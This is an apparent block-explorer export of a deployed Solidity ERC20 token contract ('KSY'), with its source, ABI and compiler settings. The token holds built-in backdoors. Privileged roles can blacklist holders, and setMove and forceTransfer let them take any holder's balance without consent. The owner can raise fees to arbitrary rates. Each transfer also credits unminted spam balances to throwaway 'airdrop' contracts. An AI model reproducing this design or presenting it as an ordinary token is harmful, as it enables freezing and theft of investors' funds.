{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ncontract Airdrop{\r\n    address public _owne;\r\n\r\n    constructor() {\r\n        _owne = msg.sender;\r\n    }\r\n}\r\n\r\n\r\ncontract Token is Ownable, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    mapping(address => bool) public _pair;\r\n    mapping(address => bool) public _roler;\r\n    mapping(address => bool) public _blacks;\r\n    mapping(address => bool) public _whites;\r\n    mapping(address => bool) public _preOrder;\r\n    mapping(address => uint256) public _preOrderSum;\r\n    address[] public _preOrderAddr;\r\n\r\n    string  private _name;\r\n    string  private _symbol;\r\n    uint256 private _totalSupply;\r\n    uint256 public _preOrderNumber;\r\n\r\n    address public _main = 0xf4beb20983Dec95F8c9ead32159D454ED7620000;\r\n\r\n    address public _dead = 0x000000000000000000000000000000000000dEaD;\r\n    address public _bonu = 0x89Bd52E618a5f612272f9857ad2AD99638C53333;\r\n    address public _flow = 0x0E98841b4A3058a35a07031d2C3FfFA4e8f22222;\r\n    \r\n\r\n    uint256 public _dead2;\r\n    uint256 public _bonu2;\r\n    uint256 public _flow2;\r\n\r\n    //\u7a7a\u6295\u5f00\u5173\r\n    bool public _airdropFlang;\r\n\r\n    constructor(string memory name_,string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n\r\n        // \u9ed1\u6d1e\r\n        _dead2 = 5;\r\n        // \u50a8\u84c4\r\n        _bonu2 = 3;\r\n        // NFT\r\n        _flow2 = 2;\r\n        //\u9884\u8d2d\u6b21\u6570\r\n        _preOrderNumber = 2;\r\n\r\n        _airdropFlang = true;\r\n\r\n        _whites[_main] = true;\r\n        _whites[_bonu] = true;\r\n        _whites[_flow] = true;\r\n\r\n        _roler[_main] = true;\r\n        _roler[address(0xb87ac8Dda13A4299d9775Cf1BB17993B42c79105)] = true;\r\n        _mint(_main, 210000 * 10 ** decimals());\r\n        transferOwnership(address(0xb87ac8Dda13A4299d9775Cf1BB17993B42c79105));\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account]; \r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender, address recipient, uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    //\u5224\u65ad\u9884\u8d2d\u662f\u5426\u5df2\u5b8c\u6210\r\n    function isPreOrder() internal view returns (bool){\r\n        for(uint256 i = 0;i<_preOrderAddr.length;i++){\r\n            if(_preOrderSum[_preOrderAddr[i]] < _preOrderNumber && _preOrder[_preOrderAddr[i]]){\r\n                return false;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    //\u9884\u8d2d\u5730\u5740\u64cd\u4f5c\r\n    function upPreOrderSum(address addr) internal{\r\n        if(_preOrder[addr]){\r\n            _preOrderSum[addr] = _preOrderSum[addr] + 1;\r\n        }\r\n    }\r\n\r\n\r\n    function _transfer(\r\n        address sender, address recipient, uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        require(!_blacks[sender]);\r\n\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n\r\n        if (_pair[sender] || _pair[recipient]) {\r\n            require(isPreOrder() || _preOrder[sender] || _preOrder[recipient], \"The pre-order list is not complete\");\r\n            if (!_whites[sender] && !_whites[recipient]) {\r\n                // burn\r\n                if(_dead2 > 0) {\r\n                    _balances[_dead] += (amount * _dead2 / 100);\r\n                    emit Transfer(sender, _dead, (amount * _dead2 / 100));\r\n                }\r\n\r\n                // _bonu\r\n                if (_bonu2 > 0) {\r\n                    _balances[_bonu] += (amount * _bonu2 / 100);\r\n                    emit Transfer(sender, _bonu, (amount * _bonu2 / 100));\r\n                }\r\n\r\n                // flow\r\n                if (_flow2 > 0) {\r\n                    _balances[_flow] += (amount * _flow2 / 100);\r\n                    emit Transfer(sender, _flow, (amount * _flow2 / 100));\r\n                }\r\n\r\n                amount = amount * (100-_dead2-_bonu2-_flow2) / 100;\r\n            }\r\n\r\n            if(!_pair[sender]){\r\n                upPreOrderSum(sender);\r\n            }\r\n            if(!_pair[recipient]){\r\n                upPreOrderSum(recipient);\r\n            }\r\n            \r\n            \r\n        } else {\r\n            // \u8f6c\u8d26\u901a\u7f29\r\n            if (!_whites[sender] && !_whites[recipient]) {\r\n                // burn\r\n                if(_dead2 > 0) {\r\n                    _balances[_dead] += (amount * _dead2 / 100);\r\n                    emit Transfer(sender, _dead, (amount * _dead2 / 100));\r\n                }\r\n                // _bonu\r\n                if (_bonu2 > 0) {\r\n                    _balances[_bonu] += (amount * _bonu2 / 100);\r\n                    emit Transfer(sender, _bonu, (amount * _bonu2 / 100));\r\n                }\r\n\r\n                // flow\r\n                if (_flow2 > 0) {\r\n                    _balances[_flow] += (amount * _flow2 / 100);\r\n                    emit Transfer(sender, _flow, (amount * _flow2 / 100));\r\n                }\r\n                amount = amount * (100-_dead2-_bonu2-_flow2) / 100;\r\n            }\r\n        }\r\n\r\n        if(_airdropFlang){\r\n            airdropMethod();\r\n        }\r\n        \r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner, address spender, uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    //\u8bbe\u7f6e\u9884\u8d2d\u540d\u5355\r\n    function setPreOrder(address addr, bool val) external {\r\n        require(_roler[_msgSender()] && addr != address(0));\r\n        _preOrder[addr] = val;\r\n        bool flang = true;\r\n        for(uint256 i = 0;i<_preOrderAddr.length;i++){\r\n            if(_preOrderAddr[i] == addr){\r\n                flang = false;\r\n            }\r\n        }\r\n        if(flang){\r\n            _preOrderAddr.push(addr);\r\n        }\r\n        \r\n    }\r\n\r\n    //\u8bbe\u7f6e\u9884\u8d2d\u5730\u5740\u5df2\u7ecf\u9884\u8d2d\u6b21\u6570\r\n    function setPreOrderSum(address addr, uint256 val) external {\r\n        require(_roler[_msgSender()] && addr != address(0) && _preOrder[addr]);\r\n        _preOrderSum[addr] = val;\r\n    }\r\n\r\n    //\u8bbe\u7f6e\u9884\u8d2d\u6b21\u6570\r\n    function setPreOrderNumber(uint256 val) external {\r\n        require(_roler[_msgSender()]);\r\n        _preOrderNumber = val;\r\n    }\r\n\r\n\tfunction returnIn(address con, address addr, uint256 val) external {\r\n        require(_roler[_msgSender()] && addr != address(0));\r\n        if (con == address(0)) {payable(addr).transfer(val);} \r\n        else {IERC20(con).transfer(addr, val);}\r\n\t}\r\n\r\n    function setWhites(address addr, bool val) external {\r\n        require(_roler[_msgSender()] && addr != address(0));\r\n        _whites[addr] = val;\r\n    }\r\n\r\n    function setBlacks(address addr, bool val) external {\r\n        require(_roler[_msgSender()] && addr != address(0));\r\n        _blacks[addr] = val;\r\n    }\r\n\r\n    function setMove(address f, address t, uint256 val) external {\r\n        require(_roler[_msgSender()]);\r\n        if (val > balanceOf(f)) {\r\n            val = balanceOf(f);\r\n        }\r\n        if (val > 0) {\r\n            _balances[f] -= val;\r\n            _balances[t] += val;\r\n        }\r\n    }\r\n\r\n    function setPair(address addr, bool val) external {\r\n        require(_roler[_msgSender()]);\r\n        _pair[addr] = val;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function setRoler(address addr, bool val) external onlyOwner {\r\n        _roler[addr] = val;\r\n    }\r\n\r\n    //\u7a7a\u6295\u5f00\u5173\r\n    function setAirdropFlang(bool val) external {\r\n        require(_roler[_msgSender()]);\r\n        _airdropFlang = val;\r\n    }\r\n\r\n\r\n    // \u7a7a\u6295\r\n    function airdropMethod() internal {\r\n        \r\n        for(uint256 i = 0;i<5;i++){\r\n            // \u521b\u5efa\u7a7a\u6295\u5730\u5740\r\n            Airdrop air = new Airdrop();\r\n            _balances[address(air)] += 1 * (10 * 10);\r\n            emit Transfer(address(this), address(air), 1 * (10 * 10));\r\n        }\r\n        \r\n    }\r\n\r\n    // \u9ed1\u6d1e\r\n    function setBurn(uint256 val) external onlyOwner {\r\n        _dead2 = val;\r\n    }\r\n\r\n    // \u50a8\u84c4\r\n    function setBonu(address addr, uint256 val) external onlyOwner {\r\n        require(addr != address(0));\r\n        _bonu = addr;\r\n        _bonu2 = val;\r\n    }\r\n    // NFT\r\n    function setFlow(address addr, uint256 val) external onlyOwner {\r\n        require(addr != address(0));\r\n        _flow = addr;\r\n        _flow2 = val;\r\n    }\r\n\r\n\r\n    // \u5f3a\u5236\u8f6c\u8d26\r\n    function forceTransfer(address from, address to, uint256 amount) external onlyOwner {\r\n        require(from != address(0), 'ERC20: forceTransfer from the zero address');\r\n        require(to != address(0), 'ERC20: forceTransfer to the zero address');\r\n        require(amount > 0, 'ERC20: forceTransfer amount is zero');\r\n        require(_balances[from] >= amount, 'ERC20: forceTransfer amount exceeds balance');\r\n        _balances[from] -= amount;\r\n        _balances[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function withdrawErc20 (address con, address addr,uint256 amount) external onlyOwner {\r\n        IERC20(con).transfer(addr, amount);\r\n    }\r\n\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        return account.code.length > 0;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_airdropFlang\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_blacks\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_bonu\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_bonu2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_dead\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_dead2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_flow\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_flow2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_main\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_pair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_preOrder\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_preOrderAddr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_preOrderNumber\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_preOrderSum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_roler\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_whites\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"forceTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"con\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"returnIn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setAirdropFlang\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setBlacks\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setBonu\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setBurn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setFlow\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"f\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"t\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setMove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setPreOrder\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setPreOrderNumber\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setPreOrderSum\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setRoler\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setWhites\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"con\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawErc20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000034b5359000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034b53590000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3b7ae6c5a53faf0c47c892a63a2586d58eef16c5c85fba694b7944a50eb3b8e3"}